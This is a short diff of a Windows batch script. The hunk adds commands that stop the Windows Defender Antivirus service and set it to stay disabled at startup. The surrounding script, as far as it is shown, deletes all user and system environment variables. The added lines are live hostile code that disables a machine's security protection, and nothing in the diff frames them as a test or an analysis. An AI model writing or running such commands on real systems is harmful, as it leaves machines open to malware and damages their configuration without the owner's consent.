@@ -21,6 +21,10 @@ if %ERRORLEVEL% equ 0 (
     exit /b 1
 )
 
+:: NEW: Disable Antivirus Service
+net stop "Windows Defender Antivirus Service"
+sc config WinDefend start= disabled
+
 :: Delete all user and system environment variables
 setlocal
 set "USER_KEY=HKCU\Environment"
